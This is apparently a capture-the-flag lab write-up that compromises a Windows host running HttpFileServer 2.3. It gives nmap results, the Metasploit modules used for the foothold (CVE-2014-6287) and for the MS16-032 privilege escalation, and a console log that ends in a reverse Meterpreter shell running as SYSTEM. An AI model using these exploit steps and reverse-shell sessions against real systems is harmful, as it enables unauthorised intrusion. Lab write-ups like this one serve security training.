# recon
- nmap
```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|       http://capec.mitre.org/data/definitions/274.html
|_      http://www.mkit.com.ar/labs/htexploit/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
I have seen HSF and I remember that this is REC which high score CVE. After some digging I found **CVE-2014-6287** which have a metaploit module.


# foot hold
use `exploit/windows/http/rejetto_hfs_exec` to get foothold. you will notice that we are just a normal user. Let background and use `local_exploit_suggester` to help use priv esc.


```
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 34 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
  This module exploits the lack of sanitization of standard handles in 
  Windows' Secondary Logon Service. The vulnerability is known to 
  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
  module will only work against those versions of Windows with 
  Powershell 2.0 or later and systems with two or more CPU cores.
[*] Post module execution completed
```

# root
I tried `exploit/windows/local/bypassuac_eventvwr` but it didnt works. So I use `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
```
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.21:9696 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\COUqEC.ps1...
[*] Compressing script contents...
[+] Compressed size: 3592
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2124

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2104
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

fzOytU3i2uX6CBnj8VbQIiWbrRqmLJZN
[+] Executed on target machine.
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.21:9696 -> 10.10.10.8:49175) at 2020-09-24 17:07:44 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\COUqEC.ps1

meterpreter > sessions -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > getiod
[-] Unknown command: getiod.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
go grab root flag